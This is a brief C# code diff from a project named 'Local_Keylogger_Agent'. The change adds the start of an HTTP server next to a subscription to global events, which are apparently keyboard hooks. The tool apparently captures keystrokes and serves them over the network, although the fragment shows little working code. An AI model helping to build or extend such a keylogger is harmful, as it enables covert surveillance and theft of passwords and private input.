@@ -11,6 +11,10 @@ namespace Local_Keylogger_Agent
             Storage storage = new Storage();
 
             SubscribeGlobal();
+
+            // Start the HTTP server
+            HTTPServer HTTPServer = new HTTPServer();
+            HTTPServer.StartHTTPServer();
         }
 
         // Subscribe to all global events
